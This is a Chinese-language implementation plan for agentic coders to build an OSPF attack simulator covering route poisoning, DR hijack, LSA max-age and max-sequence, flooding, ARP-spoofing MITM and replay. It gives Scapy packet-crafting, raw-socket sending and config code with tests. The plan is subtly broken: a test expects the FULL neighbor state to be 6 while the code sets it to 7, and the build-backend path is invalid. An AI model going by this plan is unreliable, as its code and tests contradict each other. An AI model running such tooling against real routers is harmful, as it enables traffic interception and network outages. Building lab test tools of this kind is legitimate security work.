# OSPF 协议攻击模拟器 — 实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 构建可独立运行的 OSPF 协议攻击模拟测试工具，Python 库 + CLI 双层架构，PyInstaller 打包为单 exe，支持 12 种攻击类型。

**Architecture:** 插件式架构——核心引擎负责协议构造/嗅探/发包，每个攻击类型为独立模块实现 AttackBase 接口。双嗅探模式（集线器 / ARP 欺骗），三层配置优先级（默认值 → YAML → CLI）。

**Tech Stack:** Python 3.10+, Scapy (OSPF), pcap-ct + Npcap, Click, PyInstaller, pytest, PyYAML

---

## 文件结构规划

| 文件 | 职责 |
|------|------|
| `ospf_attack/config/types.py` | AttackConfig / SniffMode / AttackMode 等 dataclass 定义 |
| `ospf_attack/config/config.py` | 配置加载器：默认值 → YAML → CLI 三层合并 |
| `ospf_attack/core/packet.py` | OSPF 报文构造/解析封装（基于 Scapy） |
| `ospf_attack/core/router.py` | 虚拟路由器身份管理 |
| `ospf_attack/core/neighbor.py` | 邻居状态机（Down→Init→2-Way→Full） |
| `ospf_attack/core/lsa_db.py` | 链路状态数据库模拟 |
| `ospf_attack/core/event.py` | 事件总线 |
| `ospf_attack/core/sniffer.py` | 被动嗅探引擎（基于 pcap-ct） |
| `ospf_attack/core/arp_spoof.py` | ARP 欺骗引擎 |
| `ospf_attack/network/sender.py` | 发包器（Scapy + Raw Socket 降级） |
| `ospf_attack/network/adapter.py` | 接口抽象层 |
| `ospf_attack/attacks/base.py` | AttackBase 抽象基类 + AttackResult |
| `ospf_attack/attacks/adjacency/hello_inject.py` | 恶意 Hello 注入 |
| `ospf_attack/attacks/adjacency/adjacency_break.py` | 邻接关系破坏 |
| `ospf_attack/attacks/adjacency/dr_bdr_hijack.py` | DR/BDR 选举操纵 |
| `ospf_attack/attacks/lsa/route_inject.py` | 路由注入/毒化 |
| `ospf_attack/attacks/lsa/max_seq.py` | 最大序列号攻击 |
| `ospf_attack/attacks/lsa/max_age.py` | Max-Age 攻击 |
| `ospf_attack/attacks/lsa/fight_back.py` | Fight-back 反击 |
| `ospf_attack/attacks/dos/flood.py` | Hello/LSA 泛洪 |
| `ospf_attack/attacks/dos/spf_recalc.py` | SPF 重计算攻击 |
| `ospf_attack/attacks/dos/db_overflow.py` | 数据库溢出 |
| `ospf_attack/attacks/protocol/mitm.py` | 中间人攻击 |
| `ospf_attack/attacks/protocol/replay.py` | 重放攻击 |
| `ospf_attack/cli/main.py` | Click CLI 入口 |
| `ospf_attack/cli/commands.py` | CLI 子命令注册 |
| `ospf_attack/cli/formatters.py` | 输出格式化 |
| `ospf_attack/npcap/detector.py` | Npcap 检测 |
| `ospf_attack/npcap/installer.py` | Npcap 安装器 |
| `ospf_attack/utils/validators.py` | 参数校验 |
| `ospf_attack/utils/logging.py` | 审计日志 |

---

## Phase 1: 项目骨架

### Task 1: 初始化项目

**Files:**
- Create: `pyproject.toml`
- Create: `ospf_attack/__init__.py`

- [ ] **Step 1: 创建 pyproject.toml**

```toml
[build-system]
requires = ["setuptools>=68.0"]
build-backend = "setuptools.backends._legacy:_Backend"

[project]
name = "ospf-attack"
version = "0.1.0"
description = "OSPF Protocol Attack Simulator"
requires-python = ">=3.10"
dependencies = [
    "scapy>=2.5.0",
    "click>=8.1.0",
    "pyyaml>=6.0",
    "pcap-ct>=1.1.0",
]
license = {text = "MIT"}

[project.optional-dependencies]
dev = [
    "pytest>=8.0",
    "pytest-mock>=3.12",
]

[project.scripts]
ospf-attack = "ospf_attack.cli.main:cli"

[tool.setuptools.packages.find]
include = ["ospf_attack*"]
```

- [ ] **Step 2: 创建 ospf_attack/__init__.py**

```python
"""OSPF Protocol Attack Simulator."""

__version__ = "0.1.0"
```

- [ ] **Step 3: 创建所有空目录**

Run: 
```bash
cd "D:\cc\OSPF_Protocol_Attack"
mkdir -p ospf_attack/core
mkdir -p ospf_attack/attacks/adjacency
mkdir -p ospf_attack/attacks/lsa
mkdir -p ospf_attack/attacks/dos
mkdir -p ospf_attack/attacks/protocol
mkdir -p ospf_attack/network
mkdir -p ospf_attack/config
mkdir -p ospf_attack/cli
mkdir -p ospf_attack/npcap
mkdir -p ospf_attack/utils
mkdir -p tests/unit
mkdir -p tests/integration
mkdir -p docker/topo1-single-area/frr/r1
mkdir -p docker/topo1-single-area/frr/r2
mkdir -p docker/topo2-multi-area
mkdir -p assets
```

- [ ] **Step 4: 创建各包的 __init__.py**

Run:
```bash
touch ospf_attack/core/__init__.py
touch ospf_attack/attacks/__init__.py
touch ospf_attack/attacks/adjacency/__init__.py
touch ospf_attack/attacks/lsa/__init__.py
touch ospf_attack/attacks/dos/__init__.py
touch ospf_attack/attacks/protocol/__init__.py
touch ospf_attack/network/__init__.py
touch ospf_attack/config/__init__.py
touch ospf_attack/cli/__init__.py
touch ospf_attack/npcap/__init__.py
touch ospf_attack/utils/__init__.py
touch tests/__init__.py
touch tests/unit/__init__.py
touch tests/integration/__init__.py
```

- [ ] **Step 5: 安装依赖并验证**

Run:
```bash
cd "D:\cc\OSPF_Protocol_Attack"
pip install -e ".[dev]"
python -c "import ospf_attack; print(ospf_attack.__version__)"
```
Expected: `0.1.0`

- [ ] **Step 6: 提交**

```bash
git add -A
git commit -m "chore: initialize project skeleton with pyproject.toml and directory structure"
```

---

## Phase 2: 配置类型

### Task 2: 实现配置类型定义

**Files:**
- Create: `ospf_attack/config/types.py`
- Create: `tests/unit/test_config_types.py`

- [ ] **Step 1: 编写测试**

```python
# tests/unit/test_config_types.py
import pytest
from ospf_attack.config.types import (
    AttackMode, SniffMode, AttackCategory, AttackResult,
    AttackConfig, HelloInjectionConfig, LSAConfig, DoSConfig, MITMConfig, ReplayConfig,
)


class TestAttackMode:
    def test_passive_value(self):
        assert AttackMode.PASSIVE.value == "passive"

    def test_active_value(self):
        assert AttackMode.ACTIVE.value == "active"


class TestSniffMode:
    def test_hub_value(self):
        assert SniffMode.HUB.value == "hub"

    def test_arp_spoof_value(self):
        assert SniffMode.ARP_SPOOF.value == "arp_spoof"


class TestAttackCategory:
    def test_four_categories(self):
        values = [c.value for c in AttackCategory]
        assert sorted(values) == sorted(["adjacency", "lsa", "dos", "protocol"])


class TestAttackResult:
    def test_defaults(self):
        r = AttackResult(success=False, packets_sent=0, target_affected=False, details="")
        assert r.success is False
        assert r.packets_sent == 0
        assert r.target_affected is False
        assert r.evidence == {}

    def test_success_result(self):
        r = AttackResult(success=True, packets_sent=50, target_affected=True, details="注入成功")
        assert r.success is True
        assert r.packets_sent == 50
        assert r.target_affected is True


class TestAttackConfig:
    def test_default_values(self):
        c = AttackConfig(iface="eth0", target="10.0.0.1")
        assert c.mode == AttackMode.PASSIVE
        assert c.sniff_mode == SniffMode.HUB
        assert c.router_id == "1.1.1.1"
        assert c.area_id == "0.0.0.0"
        assert c.sniff_duration == 30
        assert c.packet_rate == 10
        assert c.max_packets == 0

    def test_custom_values(self):
        c = AttackConfig(
            iface="eth1", target="192.168.1.0/24",
            mode=AttackMode.ACTIVE, sniff_mode=SniffMode.ARP_SPOOF,
            router_id="2.2.2.2", area_id="0.0.0.1",
            sniff_duration=60, packet_rate=100, max_packets=500,
            arp_target_a="10.0.0.1", arp_target_b="10.0.0.2", arp_interval=5,
            verbose=True, pcap_output="out.pcap",
        )
        assert c.mode == AttackMode.ACTIVE
        assert c.sniff_mode == SniffMode.ARP_SPOOF
        assert c.arp_target_a == "10.0.0.1"
        assert c.arp_target_b == "10.0.0.2"
        assert c.arp_interval == 5
        assert c.verbose is True
        assert c.pcap_output == "out.pcap"


class TestHelloInjectionConfig:
    def test_defaults(self):
        c = HelloInjectionConfig(iface="eth0", target="10.0.0.1")
        assert c.hello_interval == 10
        assert c.router_dead_interval == 40
        assert c.router_priority == 255
        assert c.auth_type == "none"
        assert c.auth_key == ""
        assert c.subnet_mask == "255.255.255.0"

    def test_with_auth(self):
        c = HelloInjectionConfig(iface="eth0", target="10.0.0.1",
                                 auth_type="md5", auth_key="secret")
        assert c.auth_type == "md5"
        assert c.auth_key == "secret"


class TestLSAConfig:
    def test_defaults(self):
        c = LSAConfig(iface="eth0", target="224.0.0.5")
        assert c.lsa_type == 5
        assert c.sequence_number == 0x80000001
        assert c.age == 0
        assert c.metric == 1
        assert c.external_routes == []

    def test_max_age_config(self):
        c = LSAConfig(iface="eth0", target="224.0.0.5", age=3600, lsa_type=1)
        assert c.age == 3600
        assert c.lsa_type == 1


class TestDoSConfig:
    def test_defaults(self):
        c = DoSConfig(iface="eth0", target="224.0.0.5")
        assert c.duration == 60
        assert c.thread_count == 1
        assert c.lsa_change_interval == 2
        assert c.lsa_count == 1000


class TestMITMConfig:
    def test_defaults(self):
        c = MITMConfig(iface="eth0", target="10.0.0.0/24")
        assert c.action == "modify"
        assert c.modify_rules == []


class TestReplayConfig:
    def test_defaults(self):
        c = ReplayConfig(iface="eth0", target="224.0.0.5")
        assert c.replay_loop is False
        assert c.replay_interval == 5
        assert c.capture_file == ""
        assert c.modify_fields == {}
```

- [ ] **Step 2: 运行测试确认失败**

```bash
pytest tests/unit/test_config_types.py -v
```
Expected: FAIL — module not found

- [ ] **Step 3: 实现配置类型**

```python
# ospf_attack/config/types.py
from dataclasses import dataclass, field
from enum import Enum


class AttackMode(Enum):
    PASSIVE = "passive"
    ACTIVE  = "active"


class SniffMode(Enum):
    HUB       = "hub"
    ARP_SPOOF = "arp_spoof"


class AttackCategory(Enum):
    ADJACENCY = "adjacency"
    LSA       = "lsa"
    DOS       = "dos"
    PROTOCOL  = "protocol"


@dataclass
class AttackResult:
    success: bool
    packets_sent: int
    target_affected: bool
    details: str
    evidence: dict = field(default_factory=dict)


@dataclass
class AttackConfig:
    """所有攻击类型共享的基础配置"""
    iface: str
    target: str
    mode: AttackMode = AttackMode.PASSIVE
    sniff_mode: SniffMode = SniffMode.HUB
    router_id: str = "1.1.1.1"
    area_id: str = "0.0.0.0"

    sniff_duration: int = 30

    arp_target_a: str = ""
    arp_target_b: str = ""
    arp_interval: int = 2

    packet_rate: int = 10
    max_packets: int = 0

    verbose: bool = False
    pcap_output: str = ""


@dataclass
class HelloInjectionConfig(AttackConfig):
    """恶意 Hello 注入 / 邻接破坏 / DR 操纵 专用配置"""
    hello_interval: int = 10
    router_dead_interval: int = 40
    router_priority: int = 255
    auth_type: str = "none"
    auth_key: str = ""
    subnet_mask: str = "255.255.255.0"


@dataclass
class LSAConfig(AttackConfig):
    """LSA 攻击专用配置"""
    lsa_type: int = 5
    link_state_id: str = ""
    advertising_router: str = ""
    sequence_number: int = 0x80000001
    age: int = 0
    metric: int = 1
    network_mask: str = "255.255.255.0"
    forwarding_address: str = "0.0.0.0"
    external_routes: list = field(default_factory=list)


@dataclass
class DoSConfig(AttackConfig):
    """拒绝服务攻击专用配置"""
    duration: int = 60
    thread_count: int = 1
    lsa_change_interval: int = 2
    lsa_count: int = 1000


@dataclass
class MITMConfig(AttackConfig):
    """中间人攻击专用配置"""
    target_a: str = ""
    target_b: str = ""
    action: str = "modify"
    modify_rules: list = field(default_factory=list)


@dataclass
class ReplayConfig(AttackConfig):
    """重放攻击专用配置"""
    capture_file: str = ""
    replay_loop: bool = False
    replay_interval: int = 5
    modify_fields: dict = field(default_factory=dict)
```

- [ ] **Step 4: 运行测试确认通过**

```bash
pytest tests/unit/test_config_types.py -v
```
Expected: 14 passed

- [ ] **Step 5: 提交**

```bash
git add tests/unit/test_config_types.py ospf_attack/config/types.py ospf_attack/config/__init__.py
git commit -m "feat: add config type definitions with dataclasses and enums"
```

---

## Phase 3: 核心引擎

### Task 3: 工具函数 — 校验与日志

**Files:**
- Create: `ospf_attack/utils/validators.py`
- Create: `ospf_attack/utils/logging.py`
- Create: `ospf_attack/utils/__init__.py`
- Create: `tests/unit/test_validators.py`
- Create: `tests/unit/test_setup_logging.py`

- [ ] **Step 1: 编写 validators 测试**

```python
# tests/unit/test_validators.py
import pytest
from ospf_attack.utils.validators import is_valid_ip, is_valid_router_id


class TestIsValidIP:
    def test_valid_ip(self):
        assert is_valid_ip("192.168.1.1") is True

    def test_valid_zero(self):
        assert is_valid_ip("0.0.0.0") is True

    def test_invalid_ip(self):
        assert is_valid_ip("999.999.999.999") is False

    def test_empty_string(self):
        assert is_valid_ip("") is False

    def test_not_ip(self):
        assert is_valid_ip("hello") is False


class TestIsValidRouterID:
    def test_valid(self):
        assert is_valid_router_id("1.1.1.1") is True

    def test_zero(self):
        assert is_valid_router_id("0.0.0.0") is True

    def test_multicast(self):
        assert is_valid_router_id("224.0.0.5") is False

    def test_invalid(self):
        assert is_valid_router_id("abc") is False
```

- [ ] **Step 2: 编写 setup_logging 测试**

```python
# tests/unit/test_setup_logging.py
import logging
from ospf_attack.utils.logging import setup_logging


def test_setup_logging_returns_logger():
    logger = setup_logging(verbose=False)
    assert isinstance(logger, logging.Logger)


def test_setup_logging_verbose():
    logger = setup_logging(verbose=True)
    assert logger.level == logging.DEBUG


def test_setup_logging_quiet():
    logger = setup_logging(verbose=False)
    assert logger.level == logging.INFO
```

- [ ] **Step 3: 运行测试确认失败**

```bash
pytest tests/unit/test_validators.py tests/unit/test_setup_logging.py -v
```
Expected: FAIL

- [ ] **Step 4: 实现 validators.py**

```python
# ospf_attack/utils/validators.py
import ipaddress


def is_valid_ip(ip: str) -> bool:
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def is_valid_router_id(rid: str) -> bool:
    if not is_valid_ip(rid):
        return False
    addr = ipaddress.ip_address(rid)
    return not addr.is_multicast and not addr.is_unspecified
```

- [ ] **Step 5: 实现 logging.py**

```python
# ospf_attack/utils/logging.py
import logging
import sys


def setup_logging(verbose: bool = False) -> logging.Logger:
    logger = logging.getLogger("ospf_attack")
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    if not logger.handlers:
        handler = logging.StreamHandler(sys.stderr)
        handler.setFormatter(logging.Formatter(
            "[%(asctime)s] %(levelname)s: %(message)s",
            datefmt="%H:%M:%S",
        ))
        logger.addHandler(handler)
    return logger
```

- [ ] **Step 6: 运行测试确认通过**

```bash
pytest tests/unit/test_validators.py tests/unit/test_setup_logging.py -v
```
Expected: 11 passed

- [ ] **Step 7: 提交**

```bash
git add ospf_attack/utils/ tests/unit/test_validators.py tests/unit/test_setup_logging.py
git commit -m "feat: add validators and logging utilities"
```

---

### Task 4: OSPF 报文构造/解析引擎

**Files:**
- Create: `ospf_attack/core/packet.py`
- Create: `tests/unit/test_packet.py`

- [ ] **Step 1: 编写测试**

```python
# tests/unit/test_packet.py
import pytest
from ospf_attack.core.packet import (
    build_hello_packet, build_lsu_packet, build_lsa_header,
    parse_ospf_packet, get_ospf_type_name, OSPF_TYPE_HELLO, OSPF_TYPE_LSU,
)


class TestBuildHelloPacket:
    def test_minimal_hello(self):
        pkt = build_hello_packet(
            router_id="1.1.1.1", area_id="0.0.0.0",
            src_ip="10.0.0.1", dst_ip="224.0.0.5",
        )
        assert pkt is not None
        assert pkt.haslayer("OSPF_Hdr")
        assert pkt["OSPF_Hdr"].type == OSPF_TYPE_HELLO
        assert pkt["OSPF_Hdr"].router_id == "1.1.1.1"
        assert pkt["OSPF_Hdr"].area == "0.0.0.0"

    def test_hello_with_priority(self):
        pkt = build_hello_packet(
            router_id="1.1.1.1", area_id="0.0.0.0",
            src_ip="10.0.0.1", dst_ip="224.0.0.5",
            router_priority=200,
        )
        assert pkt["OSPF_Hello"].router_priority == 200

    def test_hello_with_auth(self):
        pkt = build_hello_packet(
            router_id="1.1.1.1", area_id="0.0.0.0",
            src_ip="10.0.0.1", dst_ip="224.0.0.5",
            auth_type=2, auth_key=b"secret12345678",
        )
        assert pkt["OSPF_Hdr"].authtype == 2


class TestBuildLSUPacket:
    def test_minimal_lsu(self):
        pkt = build_lsu_packet(
            router_id="1.1.1.1", area_id="0.0.0.0",
            src_ip="10.0.0.1", dst_ip="224.0.0.5",
            lsa_count=0,
        )
        assert pkt is not None
        assert pkt["OSPF_Hdr"].type == OSPF_TYPE_LSU


class TestBuildLSAHeader:
    def test_router_lsa(self):
        lsa = build_lsa_header(
            lsa_type=1, link_state_id="1.1.1.1",
            advertising_router="1.1.1.1",
            sequence=0x80000001, age=0,
        )
        assert lsa is not None

    def test_external_lsa(self):
        lsa = build_lsa_header(
            lsa_type=5, link_state_id="10.0.0.0",
            advertising_router="1.1.1.1",
            sequence=0x80000001, age=0,
        )
        assert lsa is not None

    def test_max_age_lsa(self):
        lsa = build_lsa_header(
            lsa_type=1, link_state_id="1.1.1.1",
            advertising_router="1.1.1.1",
            sequence=0x80000001, age=3600,
        )
        assert lsa is not None

    def test_max_sequence(self):
        lsa = build_lsa_header(
            lsa_type=1, link_state_id="1.1.1.1",
            advertising_router="1.1.1.1",
            sequence=0x7FFFFFFF, age=0,
        )
        assert lsa is not None


class TestParseOSPFacket:
    def test_returns_none_for_non_ospf(self):
        from scapy.all import IP, UDP
        pkt = IP() / UDP(sport=12345, dport=53)
        result = parse_ospf_packet(bytes(pkt))
        assert result is None


class TestOSPFTypeName:
    def test_hello(self):
        assert get_ospf_type_name(1) == "Hello"

    def test_lsu(self):
        assert get_ospf_type_name(4) == "LSU"
```

- [ ] **Step 2: 运行测试确认失败**

```bash
pytest tests/unit/test_packet.py -v
```
Expected: FAIL — module not found

- [ ] **Step 3: 实现 packet.py**

```python
# ospf_attack/core/packet.py
from scapy.all import IP, raw
from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello, OSPF_LSU, OSPF_LSA_Hdr

OSPF_TYPE_HELLO = 1
OSPF_TYPE_DD   = 2
OSPF_TYPE_LSR  = 3
OSPF_TYPE_LSU  = 4
OSPF_TYPE_LSAck = 5

OSPF_TYPE_NAMES = {
    1: "Hello", 2: "DB Description", 3: "LS Request",
    4: "LSU", 5: "LS Ack",
}

OSPF_MULTICAST_ALL = "224.0.0.5"
OSPF_MULTICAST_DR  = "224.0.0.6"

AUTH_NONE = 0
AUTH_PLAIN = 1
AUTH_MD5 = 2


def build_hello_packet(
    router_id: str, area_id: str, src_ip: str, dst_ip: str,
    router_priority: int = 1,
    hello_interval: int = 10,
    router_dead_interval: int = 40,
    designated_router: str = "0.0.0.0",
    backup_dr: str = "0.0.0.0",
    auth_type: int = AUTH_NONE,
    auth_key: bytes = b"",
    options: int = 0x02,
) -> IP:
    ip = IP(src=src_ip, dst=dst_ip, proto=89, ttl=1)
    ospf_hdr = OSPF_Hdr(
        version=2, type=OSPF_TYPE_HELLO,
        router_id=router_id, area=area_id,
        authtype=auth_type,
    )
    hello = OSPF_Hello(
        mask="255.255.255.0",
        hellointerval=hello_interval,
        routerdeadinterval=router_dead_interval,
        router_priority=router_priority,
        designatedrouter=designated_router,
        backupdesignatedrouter=backup_dr,
        options=options,
    )
    return ip / ospf_hdr / hello


def build_lsu_packet(
    router_id: str, area_id: str, src_ip: str, dst_ip: str,
    lsa_count: int = 1,
) -> IP:
    ip = IP(src=src_ip, dst=dst_ip, proto=89, ttl=1)
    ospf_hdr = OSPF_Hdr(
        version=2, type=OSPF_TYPE_LSU,
        router_id=router_id, area=area_id,
    )
    lsu = OSPF_LSU(lsacount=lsa_count)
    return ip / ospf_hdr / lsu


def build_lsa_header(
    lsa_type: int, link_state_id: str, advertising_router: str,
    sequence: int = 0x80000001, age: int = 0,
    options: int = 0x22,
) -> OSPF_LSA_Hdr:
    return OSPF_LSA_Hdr(
        type=lsa_type,
        id=link_state_id,
        advrouter=advertising_router,
        seq=sequence,
        age=age,
        options=options,
    )


def parse_ospf_packet(data: bytes):
    try:
        pkt = IP(raw(data))
        if pkt.haslayer(OSPF_Hdr):
            return pkt
        return None
    except Exception:
        return None


def get_ospf_type_name(ptype: int) -> str:
    return OSPF_TYPE_NAMES.get(ptype, f"Unknown({ptype})")
```

- [ ] **Step 4: 运行测试确认通过**

```bash
pytest tests/unit/test_packet.py -v
```
Expected: all passed

- [ ] **Step 5: 提交**

```bash
git add ospf_attack/core/packet.py ospf_attack/core/__init__.py tests/unit/test_packet.py
git commit -m "feat: add OSPF packet construction and parsing engine"
```

---

### Task 5: 虚拟路由器身份 + 事件总线

**Files:**
- Create: `ospf_attack/core/router.py`
- Create: `ospf_attack/core/event.py`

- [ ] **Step 1: 实现 router.py**

```python
# ospf_attack/core/router.py
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class RouterIdentity:
    router_id: str
    area_id: str = "0.0.0.0"
    router_priority: int = 1
    auth_type: int = 0                   # 0=none, 1=plain, 2=md5
    auth_key: bytes = b""
    hello_interval: int = 10
    router_dead_interval: int = 40
    interfaces: dict = field(default_factory=dict)

    def get_hello_config(self) -> dict:
        return {
            "router_id": self.router_id,
            "area_id": self.area_id,
            "router_priority": self.router_priority,
            "hello_interval": self.hello_interval,
            "router_dead_interval": self.router_dead_interval,
            "auth_type": self.auth_type,
            "auth_key": self.auth_key,
        }
```

- [ ] **Step 2: 实现 event.py**

```python
# ospf_attack/core/event.py
from typing import Callable, Dict, List


class EventBus:
    def __init__(self):
        self._handlers: Dict[str, List[Callable]] = {}

    def on(self, event_type: str, handler: Callable) -> None:
        self._handlers.setdefault(event_type, []).append(handler)

    def emit(self, event_type: str, **kwargs) -> None:
        for handler in self._handlers.get(event_type, []):
            handler(**kwargs)

    def clear(self) -> None:
        self._handlers.clear()
```

- [ ] **Step 3: 快速验证**

```bash
python -c "from ospf_attack.core.router import RouterIdentity; r=RouterIdentity('1.1.1.1'); print(r.get_hello_config())"
python -c "from ospf_attack.core.event import EventBus; b=EventBus(); b.on('test', lambda **kw: print(kw)); b.emit('test', x=1)"
```

- [ ] **Step 4: 提交**

```bash
git add ospf_attack/core/router.py ospf_attack/core/event.py
git commit -m "feat: add router identity and event bus"
```

---

### Task 6: 邻居状态机 + 链路状态数据库

**Files:**
- Create: `ospf_attack/core/neighbor.py`
- Create: `ospf_attack/core/lsa_db.py`
- Create: `tests/unit/test_neighbor.py`

- [ ] **Step 1: 编写 neighbor 测试**

```python
# tests/unit/test_neighbor.py
from ospf_attack.core.neighbor import NeighborState, NeighborEntry, NeighborTable


class TestNeighborState:
    def test_progression(self):
        states = [NeighborState.DOWN, NeighborState.INIT, NeighborState.TWO_WAY,
                  NeighborState.EXSTART, NeighborState.EXCHANGE, NeighborState.LOADING,
                  NeighborState.FULL]
        assert NeighborState.DOWN.value == 0
        assert NeighborState.FULL.value == 6


class TestNeighborEntry:
    def test_create(self):
        e = NeighborEntry(router_id="2.2.2.2", ip="10.0.0.2")
        assert e.state == NeighborState.DOWN
        assert e.dr == "0.0.0.0"

    def test_transition(self):
        e = NeighborEntry(router_id="2.2.2.2", ip="10.0.0.2")
        e.state = NeighborState.INIT
        assert e.state == NeighborState.INIT
        e.state = NeighborState.FULL
        assert e.state == NeighborState.FULL


class TestNeighborTable:
    def test_add_and_get(self):
        t = NeighborTable()
        t.add("2.2.2.2", "10.0.0.2")
        n = t.get("2.2.2.2")
        assert n is not None
        assert n.router_id == "2.2.2.2"

    def test_remove(self):
        t = NeighborTable()
        t.add("2.2.2.2", "10.0.0.2")
        t.remove("2.2.2.2")
        assert t.get("2.2.2.2") is None

    def test_list_all(self):
        t = NeighborTable()
        t.add("2.2.2.2", "10.0.0.2")
        t.add("3.3.3.3", "10.0.0.3")
        assert len(t.list_all()) == 2

    def test_count_by_state(self):
        t = NeighborTable()
        t.add("2.2.2.2", "10.0.0.2")
        t.add("3.3.3.3", "10.0.0.3")
        assert t.count_by_state(NeighborState.DOWN) == 2
        assert t.count_by_state(NeighborState.FULL) == 0
```

- [ ] **Step 2: 实现 neighbor.py**

```python
# ospf_attack/core/neighbor.py
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Dict, List, Optional


class NeighborState(IntEnum):
    DOWN     = 0
    ATTEMPT  = 1
    INIT     = 2
    TWO_WAY  = 3
    EXSTART  = 4
    EXCHANGE = 5
    LOADING  = 6
    FULL     = 7


@dataclass
class NeighborEntry:
    router_id: str
    ip: str
    state: NeighborState = NeighborState.DOWN
    dr: str = "0.0.0.0"
    bdr: str = "0.0.0.0"
    area_id: str = "0.0.0.0"


class NeighborTable:
    def __init__(self):
        self._entries: Dict[str, NeighborEntry] = {}

    def add(self, router_id: str, ip: str) -> NeighborEntry:
        entry = NeighborEntry(router_id=router_id, ip=ip)
        self._entries[router_id] = entry
        return entry

    def get(self, router_id: str) -> Optional[NeighborEntry]:
        return self._entries.get(router_id)

    def remove(self, router_id: str) -> None:
        self._entries.pop(router_id, None)

    def list_all(self) -> List[NeighborEntry]:
        return list(self._entries.values())

    def count_by_state(self, state: NeighborState) -> int:
        return sum(1 for e in self._entries.values() if e.state == state)
```

- [ ] **Step 3: 实现 lsa_db.py**

```python
# ospf_attack/core/lsa_db.py
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple


@dataclass
class LSAEntry:
    lsa_type: int
    link_state_id: str
    advertising_router: str
    sequence: int
    age: int
    checksum: int = 0
    length: int = 0
    body: bytes = b""


class LSADatabase:
    def __init__(self):
        self._entries: Dict[Tuple[int, str, str], LSAEntry] = {}

    def _key(self, lsa_type: int, link_state_id: str, adv_router: str) -> tuple:
        return (lsa_type, link_state_id, adv_router)

    def add(self, entry: LSAEntry) -> None:
        key = self._key(entry.lsa_type, entry.link_state_id, entry.advertising_router)
        existing = self._entries.get(key)
        if existing is None or entry.sequence > existing.sequence:
            self._entries[key] = entry

    def get(self, lsa_type: int, link_state_id: str, adv_router: str) -> Optional[LSAEntry]:
        return self._entries.get(self._key(lsa_type, link_state_id, adv_router))

    def remove(self, lsa_type: int, link_state_id: str, adv_router: str) -> None:
        self._entries.pop(self._key(lsa_type, link_state_id, adv_router), None)

    def list_all(self) -> List[LSAEntry]:
        return list(self._entries.values())

    def count(self) -> int:
        return len(self._entries)
```

- [ ] **Step 4: 运行测试**

```bash
pytest tests/unit/test_neighbor.py -v
```
Expected: all passed

- [ ] **Step 5: 提交**

```bash
git add ospf_attack/core/neighbor.py ospf_attack/core/lsa_db.py tests/unit/test_neighbor.py
git commit -m "feat: add neighbor state machine and LSDB simulation"
```

---

## Phase 4: 网络层

### Task 7: 发包器（Scapy + Raw Socket）

**Files:**
- Create: `ospf_attack/network/sender.py`
- Create: `ospf_attack/network/adapter.py`
- Create: `tests/unit/test_sender.py`

- [ ] **Step 1: 编写 sender 测试**

```python
# tests/unit/test_sender.py
from unittest.mock import patch, MagicMock
from ospf_attack.network.sender import PacketSender


class TestPacketSender:
    @patch("ospf_attack.network.sender.send")
    def test_send_scapy(self, mock_send):
        sender = PacketSender(iface="eth0", packet_rate=10)
        result = sender.send_raw(b"\x45\x00")
        assert result is True

    @patch("ospf_attack.network.sender.sendp")
    def test_send_l2(self, mock_sendp):
        sender = PacketSender(iface="eth0")
        from scapy.all import Ether
        pkt = Ether()
        result = sender.send_l2(pkt)
        assert result is True

    def test_packet_rate_throttle(self):
        sender = PacketSender(iface="eth0", packet_rate=100)
        assert sender._packet_interval == 0.01

    def test_max_packets_unlimited(self):
        sender = PacketSender(iface="eth0", max_packets=0)
        assert sender._can_send() is True
```

- [ ] **Step 2: 实现 sender.py + adapter.py**

```python
# ospf_attack/network/adapter.py
from enum import Enum


class NetworkEnv(Enum):
    ETHERNET = "ethernet"
    WIFI = "wifi"
    LOOPBACK = "loopback"


def get_local_mac(iface: str) -> str:
    """获取本机网卡 MAC 地址"""
    import uuid
    try:
        import netifaces
        addrs = netifaces.ifaddresses(iface)
        link = addrs.get(netifaces.AF_LINK)
        if link:
            return link[0]["addr"]
    except ImportError:
        pass
    node = uuid.getnode()
    return ":".join(f"{(node >> (i * 8)) & 0xFF:02x}" for i in reversed(range(6)))


def get_local_ip(iface: str) -> str:
    """获取本机网卡 IP 地址"""
    try:
        import netifaces
        addrs = netifaces.ifaddresses(iface)
        inet = addrs.get(netifaces.AF_INET)
        if inet:
            return inet[0]["addr"]
    except ImportError:
        pass
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()
```

```python
# ospf_attack/network/sender.py
import time
import socket
import threading
from scapy.all import send, sendp, conf


class PacketSender:
    def __init__(self, iface: str, packet_rate: int = 10, max_packets: int = 0):
        self.iface = iface
        self.packet_rate = packet_rate
        self.max_packets = max_packets
        self._sent_count = 0
        self._lock = threading.Lock()
        self._start_time = time.monotonic()
        self._packet_interval = 1.0 / packet_rate if packet_rate > 0 else 0

    def send_raw(self, data: bytes) -> bool:
        """通过 Scapy L3 send 发包"""
        if not self._can_send():
            return False
        try:
            send(data, iface=self.iface, verbose=False)
            self._inc_count()
            return True
        except Exception:
            return False

    def send_l2(self, packet) -> bool:
        """通过 Scapy L2 sendp 发包（链路层）"""
        if not self._can_send():
            return False
        try:
            sendp(packet, iface=self.iface, verbose=False)
            self._inc_count()
            return True
        except Exception:
            return False

    def send_raw_socket(self, data: bytes, dst_ip: str) -> bool:
        """通过 Raw Socket 发包（高性能，绕过 Scapy 开销）"""
        if not self._can_send():
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.sendto(data, (dst_ip, 0))
            sock.close()
            self._inc_count()
            return True
        except Exception:
            return False

    def _can_send(self) -> bool:
        if self.max_packets > 0 and self._sent_count >= self.max_packets:
            return False
        if self._packet_interval > 0:
            time.sleep(self._packet_interval)
        return True

    def _inc_count(self):
        with self._lock:
            self._sent_count += 1

    @property
    def sent_count(self) -> int:
        return self._sent_count

    @property
    def elapsed(self) -> float:
        return time.monotonic() - self._start_time
